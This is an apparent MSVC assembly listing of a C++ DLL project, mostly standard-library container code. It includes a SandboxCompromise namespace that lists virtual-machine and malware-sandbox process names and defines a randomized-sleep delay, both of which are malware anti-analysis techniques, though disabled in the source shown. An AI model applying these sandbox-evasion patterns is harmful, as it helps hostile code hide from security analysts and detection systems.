; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
;	COMDAT ??1?$_Tidy_guard@V?$vector@PEBDV?$allocator@PEBD@std@@@std@@@std@@QEAA@XZ
_TEXT	SEGMENT
this$ = 48
??1?$_Tidy_guard@V?$vector@PEBDV?$allocator@PEBD@std@@@std@@@std@@QEAA@XZ PROC ; std::_Tidy_guard<std::vector<char const *,std::allocator<char const *> > >::~_Tidy_guard<std::vector<char const *,std::allocator<char const *> > >, COMDAT

; 53   :     _CONSTEXPR20 ~_Tidy_guard() {

$LN37:
	push	rbx
	sub	rsp, 32					; 00000020H

; 54   :         if (_Target) {

	mov	rbx, QWORD PTR [rcx]
	test	rbx, rbx
	je	SHORT $LN6@Tidy_guard
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector

; 2048 :         if (_Myfirst) { // destroy and deallocate old array

	mov	rcx, QWORD PTR [rbx]
	test	rcx, rcx
	je	SHORT $LN6@Tidy_guard

; 2049 :             _STD _Destroy_range(_Myfirst, _Mylast, _Al);
; 2050 :             _ASAN_VECTOR_REMOVE;
; 2051 :             _Al.deallocate(_Myfirst, static_cast<size_type>(_Myend - _Myfirst));

	mov	rdx, QWORD PTR [rbx+16]
	sub	rdx, rcx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 950  :         _STD _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

	and	rdx, -8

; 253  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rdx, 4096				; 00001000H
	jb	SHORT $LN25@Tidy_guard

; 174  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

	mov	r8, QWORD PTR [rcx-8]
	add	rdx, 39					; 00000027H

; 175  : 
; 176  :     // If the following asserts, it likely means that we are performing
; 177  :     // an aligned delete on memory coming from an unaligned allocation.
; 178  :     _STL_ASSERT(_Ptr_user[-2] == _Big_allocation_sentinel, "invalid argument");
; 179  : 
; 180  :     // Extra paranoia on aligned allocation/deallocation; ensure _Ptr_container is
; 181  :     // in range [_Min_back_shift, _Non_user_size]
; 182  : #ifdef _DEBUG
; 183  :     constexpr uintptr_t _Min_back_shift = 2 * sizeof(void*);
; 184  : #else // ^^^ defined(_DEBUG) / !defined(_DEBUG) vvv
; 185  :     constexpr uintptr_t _Min_back_shift = sizeof(void*);
; 186  : #endif // ^^^ !defined(_DEBUG) ^^^
; 187  :     const uintptr_t _Back_shift = reinterpret_cast<uintptr_t>(_Ptr) - _Ptr_container;

	sub	rcx, r8

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	lea	rax, QWORD PTR [rcx-8]
	cmp	rax, 31
	ja	SHORT $LN22@Tidy_guard

; 189  :     _Ptr = reinterpret_cast<void*>(_Ptr_container);

	mov	rcx, r8
$LN25@Tidy_guard:

; 258  :         ::operator delete(_Ptr, _Bytes);

	call	??3@YAXPEAX_K@Z				; operator delete
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector

; 2053 :             _Myfirst = nullptr;

	xor	eax, eax
	mov	QWORD PTR [rbx], rax

; 2054 :             _Mylast  = nullptr;

	mov	QWORD PTR [rbx+8], rax

; 2055 :             _Myend   = nullptr;

	mov	QWORD PTR [rbx+16], rax
$LN6@Tidy_guard:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 57   :     }

	add	rsp, 32					; 00000020H
	pop	rbx
	ret	0
$LN22@Tidy_guard:

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	call	_invalid_parameter_noinfo_noreturn
	int	3
$LN34@Tidy_guard:
??1?$_Tidy_guard@V?$vector@PEBDV?$allocator@PEBD@std@@@std@@@std@@QEAA@XZ ENDP ; std::_Tidy_guard<std::vector<char const *,std::allocator<char const *> > >::~_Tidy_guard<std::vector<char const *,std::allocator<char const *> > >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\sandbox.hpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\sandbox.hpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\initializer_list
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\sandbox.hpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\sandbox.hpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\sandbox.hpp
;	COMDAT ??__EsuspiciousProcNames@SandboxCompromise@@YAXXZ
text$di	SEGMENT
??__EsuspiciousProcNames@SandboxCompromise@@YAXXZ PROC	; SandboxCompromise::`dynamic initializer for 'suspiciousProcNames'', COMDAT

; 18   : 	};

	mov	r11, rsp
	mov	QWORD PTR [r11+8], rbx
	push	rdi
	sub	rsp, 80					; 00000050H

; 11   : 	std::vector<const char*> suspiciousProcNames = { 

	lea	rax, OFFSET FLAT:??_C@_0L@DNNKDIOP@vmware?4exe@
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 101  :         return ::operator new(_Bytes);

	mov	ecx, 48					; 00000030H
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\sandbox.hpp

; 11   : 	std::vector<const char*> suspiciousProcNames = { 

	mov	QWORD PTR [r11-56], rax
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\initializer_list

; 34   :         : _First(_First_arg), _Last(_Last_arg) {}

	lea	rdi, QWORD PTR [r11-56]
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\sandbox.hpp

; 11   : 	std::vector<const char*> suspiciousProcNames = { 

	lea	rax, OFFSET FLAT:??_C@_0P@DGCBIEC@xenservice?4exe@
	mov	QWORD PTR [r11-48], rax
	lea	rax, OFFSET FLAT:??_C@_0L@LABEJICF@vmsrvc?4exe@
	mov	QWORD PTR [r11-40], rax
	lea	rax, OFFSET FLAT:??_C@_0BA@FBEFMLMI@vboxservice?4exe@
	mov	QWORD PTR [r11-32], rax
	lea	rax, OFFSET FLAT:??_C@_0BB@JMNMFDHB@joeboxserver?4exe@
	mov	QWORD PTR [r11-24], rax
	lea	rax, OFFSET FLAT:??_C@_0L@KKOIMBEN@prl_cc?4exe@
	mov	QWORD PTR [r11-16], rax
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 101  :         return ::operator new(_Bytes);

	call	??2@YAPEAX_K@Z				; operator new
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility

; 4621 :     _CSTD memmove(_Dest_ch, _First_ch, _Count);

	mov	r8d, 48					; 00000030H
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector

; 1994 :         _Myfirst              = _Newvec;

	mov	QWORD PTR ?suspiciousProcNames@SandboxCompromise@@3V?$vector@PEBDV?$allocator@PEBD@std@@@std@@A, rax
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility

; 4621 :     _CSTD memmove(_Dest_ch, _First_ch, _Count);

	mov	rdx, rdi
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector

; 1995 :         _Mylast               = _Newvec;

	mov	QWORD PTR ?suspiciousProcNames@SandboxCompromise@@3V?$vector@PEBDV?$allocator@PEBD@std@@@std@@A+8, rax
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 101  :         return ::operator new(_Bytes);

	mov	rbx, rax
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector

; 1996 :         _Myend                = _Newvec + _Newcapacity;

	lea	rcx, QWORD PTR [rax+48]
	mov	QWORD PTR ?suspiciousProcNames@SandboxCompromise@@3V?$vector@PEBDV?$allocator@PEBD@std@@@std@@A+16, rcx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility

; 4621 :     _CSTD memmove(_Dest_ch, _First_ch, _Count);

	mov	rcx, rax
	call	memmove
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 1822 :                 _Dest += _ULast - _UFirst;

	lea	rax, QWORD PTR [rbx+48]
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\sandbox.hpp

; 11   : 	std::vector<const char*> suspiciousProcNames = { 

	lea	rcx, OFFSET FLAT:??__FsuspiciousProcNames@SandboxCompromise@@YAXXZ ; SandboxCompromise::`dynamic atexit destructor for 'suspiciousProcNames''
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector

; 2078 :                 _My_data._Mylast = _STD _Uninitialized_copy(_STD forward<_Valty>(_Val)..., _My_data._Myfirst, _Al);

	mov	QWORD PTR ?suspiciousProcNames@SandboxCompromise@@3V?$vector@PEBDV?$allocator@PEBD@std@@@std@@A+8, rax
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\sandbox.hpp

; 11   : 	std::vector<const char*> suspiciousProcNames = { 

	mov	rbx, QWORD PTR [rsp+96]
	add	rsp, 80					; 00000050H
	pop	rdi
	jmp	atexit
??__EsuspiciousProcNames@SandboxCompromise@@YAXXZ ENDP	; SandboxCompromise::`dynamic initializer for 'suspiciousProcNames''
text$di	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
;	COMDAT ??__FsuspiciousProcNames@SandboxCompromise@@YAXXZ
text$yd	SEGMENT
??__FsuspiciousProcNames@SandboxCompromise@@YAXXZ PROC	; SandboxCompromise::`dynamic atexit destructor for 'suspiciousProcNames'', COMDAT
	sub	rsp, 40					; 00000028H
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector

; 2048 :         if (_Myfirst) { // destroy and deallocate old array

	mov	rcx, QWORD PTR ?suspiciousProcNames@SandboxCompromise@@3V?$vector@PEBDV?$allocator@PEBD@std@@@std@@A
	test	rcx, rcx
	je	SHORT $LN7@dynamic

; 2049 :             _STD _Destroy_range(_Myfirst, _Mylast, _Al);
; 2050 :             _ASAN_VECTOR_REMOVE;
; 2051 :             _Al.deallocate(_Myfirst, static_cast<size_type>(_Myend - _Myfirst));

	mov	rdx, QWORD PTR ?suspiciousProcNames@SandboxCompromise@@3V?$vector@PEBDV?$allocator@PEBD@std@@@std@@A+16
	sub	rdx, rcx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 950  :         _STD _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

	and	rdx, -8

; 253  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rdx, 4096				; 00001000H
	jb	SHORT $LN26@dynamic

; 174  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

	mov	r8, QWORD PTR [rcx-8]
	add	rdx, 39					; 00000027H

; 175  : 
; 176  :     // If the following asserts, it likely means that we are performing
; 177  :     // an aligned delete on memory coming from an unaligned allocation.
; 178  :     _STL_ASSERT(_Ptr_user[-2] == _Big_allocation_sentinel, "invalid argument");
; 179  : 
; 180  :     // Extra paranoia on aligned allocation/deallocation; ensure _Ptr_container is
; 181  :     // in range [_Min_back_shift, _Non_user_size]
; 182  : #ifdef _DEBUG
; 183  :     constexpr uintptr_t _Min_back_shift = 2 * sizeof(void*);
; 184  : #else // ^^^ defined(_DEBUG) / !defined(_DEBUG) vvv
; 185  :     constexpr uintptr_t _Min_back_shift = sizeof(void*);
; 186  : #endif // ^^^ !defined(_DEBUG) ^^^
; 187  :     const uintptr_t _Back_shift = reinterpret_cast<uintptr_t>(_Ptr) - _Ptr_container;

	sub	rcx, r8

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	lea	rax, QWORD PTR [rcx-8]
	cmp	rax, 31
	ja	SHORT $LN23@dynamic

; 189  :     _Ptr = reinterpret_cast<void*>(_Ptr_container);

	mov	rcx, r8
$LN26@dynamic:

; 258  :         ::operator delete(_Ptr, _Bytes);

	call	??3@YAXPEAX_K@Z				; operator delete
	xorps	xmm0, xmm0
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector

; 2053 :             _Myfirst = nullptr;

	mov	QWORD PTR ?suspiciousProcNames@SandboxCompromise@@3V?$vector@PEBDV?$allocator@PEBD@std@@@std@@A, 0

; 2054 :             _Mylast  = nullptr;

	movdqu	XMMWORD PTR ?suspiciousProcNames@SandboxCompromise@@3V?$vector@PEBDV?$allocator@PEBD@std@@@std@@A+8, xmm0
$LN7@dynamic:
	add	rsp, 40					; 00000028H
	ret	0
$LN23@dynamic:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	call	_invalid_parameter_noinfo_noreturn
	int	3
$LN32@dynamic:
??__FsuspiciousProcNames@SandboxCompromise@@YAXXZ ENDP	; SandboxCompromise::`dynamic atexit destructor for 'suspiciousProcNames''
text$yd	ENDS
; Function compile flags: /Ogtpy
;	COMDAT ?__autoclassinit2@?$vector@PEBDV?$allocator@PEBD@std@@@std@@QEAAX_K@Z
_TEXT	SEGMENT
this$dead$ = 8
classSize$dead$ = 16
?__autoclassinit2@?$vector@PEBDV?$allocator@PEBD@std@@@std@@QEAAX_K@Z PROC ; std::vector<char const *,std::allocator<char const *> >::__autoclassinit2, COMDAT
	xorps	xmm0, xmm0
	xor	eax, eax
	movups	XMMWORD PTR ?suspiciousProcNames@SandboxCompromise@@3V?$vector@PEBDV?$allocator@PEBD@std@@@std@@A, xmm0
	mov	QWORD PTR ?suspiciousProcNames@SandboxCompromise@@3V?$vector@PEBDV?$allocator@PEBD@std@@@std@@A+16, rax
	ret	0
?__autoclassinit2@?$vector@PEBDV?$allocator@PEBD@std@@@std@@QEAAX_K@Z ENDP ; std::vector<char const *,std::allocator<char const *> >::__autoclassinit2
_TEXT	ENDS
; Function compile flags: /Ogtpy
;	COMDAT ?__autoclassinit2@?$_Uninitialized_backout_al@V?$allocator@PEBD@std@@@std@@QEAAX_K@Z
_TEXT	SEGMENT
this$ = 8
classSize$dead$ = 16
?__autoclassinit2@?$_Uninitialized_backout_al@V?$allocator@PEBD@std@@@std@@QEAAX_K@Z PROC ; std::_Uninitialized_backout_al<std::allocator<char const *> >::__autoclassinit2, COMDAT
	xorps	xmm0, xmm0
	xor	eax, eax
	movups	XMMWORD PTR [rcx], xmm0
	mov	QWORD PTR [rcx+16], rax
	ret	0
?__autoclassinit2@?$_Uninitialized_backout_al@V?$allocator@PEBD@std@@@std@@QEAAX_K@Z ENDP ; std::_Uninitialized_backout_al<std::allocator<char const *> >::__autoclassinit2
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\sandbox.hpp
;	COMDAT ?SuspicousProcRunning@SandboxCompromise@@YAHXZ
_TEXT	SEGMENT
?SuspicousProcRunning@SandboxCompromise@@YAHXZ PROC	; SandboxCompromise::SuspicousProcRunning, COMDAT

; 22   : 		//for ( const char* app : suspiciousProcNames )
; 23   : 		//	if ( ProcessUtilities::PIDFromName(app) != -1 )
; 24   : 		//		return TRUE;
; 25   : 
; 26   : 		return FALSE;

	xor	eax, eax

; 27   : 	}

	ret	0
?SuspicousProcRunning@SandboxCompromise@@YAHXZ ENDP	; SandboxCompromise::SuspicousProcRunning
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\sandbox.hpp
;	COMDAT ?DelayOperation@SandboxCompromise@@YAXXZ
_TEXT	SEGMENT
?DelayOperation@SandboxCompromise@@YAXXZ PROC		; SandboxCompromise::DelayOperation, COMDAT

; 30   : 		//std::random_device dev;
; 31   : 		//std::mt19937 random(dev());
; 32   : 		//std::uniform_int_distribution<std::mt19937::result_type> dist(35000, 45000);
; 33   : 		////Sleep(dist(random));
; 34   : 	}

	ret	0
?DelayOperation@SandboxCompromise@@YAXXZ ENDP		; SandboxCompromise::DelayOperation
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
;	COMDAT ??__E_loadedLibs@@YAXXZ
text$di	SEGMENT
??__E_loadedLibs@@YAXXZ PROC				; `dynamic initializer for '_loadedLibs'', COMDAT

; 4    : static std::unordered_map<std::string, HMODULE> _loadedLibs;

	sub	rsp, 40					; 00000028H
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list

; 1838 :         auto _Newhead = _Al.allocate(1);

	mov	ecx, 56					; 00000038H
	call	??2@YAPEAX_K@Z				; operator new

; 1839 :         _Construct_in_place(_Newhead->_Next, _Newhead);

	mov	QWORD PTR [rax], rax

; 1840 :         _Construct_in_place(_Newhead->_Prev, _Newhead);

	mov	QWORD PTR [rax+8], rax

; 1841 :         _Mypair._Myval2._Myhead = _Newhead;

	mov	QWORD PTR ?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A+8, rax
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector

; 400  :     _CONSTEXPR20 _Vector_val() noexcept : _Myfirst(), _Mylast(), _Myend() {}

	mov	QWORD PTR ?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A+24, 0
	xorps	xmm0, xmm0
	movdqa	XMMWORD PTR ?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A+32, xmm0
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash

; 373  :         : _Traitsobj(_Parg), _List(_Al), _Vec(_Al), _Mask(_Min_buckets - 1), _Maxidx(_Min_buckets) {

	mov	QWORD PTR ?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A+48, 7
	mov	QWORD PTR ?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A+56, 8

; 374  :         // construct empty hash table
; 375  :         _Max_bucket_size() = _Bucket_size;

	mov	DWORD PTR ?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A, 1065353216 ; 3f800000H

; 376  :         _Vec._Assign_grow(_Min_buckets * 2, _List._Unchecked_end());

	mov	r8, rax
	mov	edx, 16
	lea	rcx, OFFSET FLAT:?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A+24
	call	?_Assign_grow@?$_Hash_vec@V?$allocator@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@@std@@QEAAX_KV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@2@@Z ; std::_Hash_vec<std::allocator<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > > >::_Assign_grow
	npad	1
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp

; 4    : static std::unordered_map<std::string, HMODULE> _loadedLibs;

	lea	rcx, OFFSET FLAT:??__F_loadedLibs@@YAXXZ ; `dynamic atexit destructor for '_loadedLibs''
	add	rsp, 40					; 00000028H
	jmp	atexit
??__E_loadedLibs@@YAXXZ ENDP				; `dynamic initializer for '_loadedLibs''
text$di	ENDS
; Function compile flags: /Ogtpy
;	COMDAT text$x
text$x	SEGMENT
?dtor$1@?0???__E_loadedLibs@@YAXXZ@4HA PROC		; ``dynamic initializer for '_loadedLibs'''::`1'::dtor$1
	lea	rcx, OFFSET FLAT:?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A
	add	rcx, 8
	jmp	??1?$list@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@QEAA@XZ ; std::list<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >::~list<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >
?dtor$1@?0???__E_loadedLibs@@YAXXZ@4HA ENDP		; ``dynamic initializer for '_loadedLibs'''::`1'::dtor$1
text$x	ENDS
; Function compile flags: /Ogtpy
;	COMDAT text$x
text$x	SEGMENT
?dtor$2@?0???__E_loadedLibs@@YAXXZ@4HA PROC		; ``dynamic initializer for '_loadedLibs'''::`1'::dtor$2
	lea	rcx, OFFSET FLAT:?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A
	add	rcx, 24
	jmp	??1?$_Hash_vec@V?$allocator@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@@std@@QEAA@XZ ; std::_Hash_vec<std::allocator<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > > >::~_Hash_vec<std::allocator<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > > >
?dtor$2@?0???__E_loadedLibs@@YAXXZ@4HA ENDP		; ``dynamic initializer for '_loadedLibs'''::`1'::dtor$2
text$x	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
;	COMDAT ??__F_loadedLibs@@YAXXZ
text$yd	SEGMENT
??__F_loadedLibs@@YAXXZ PROC				; `dynamic atexit destructor for '_loadedLibs'', COMDAT
	sub	rsp, 40					; 00000028H
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash

; 309  :         if (_Mypair._Myval2._Myfirst != nullptr) {

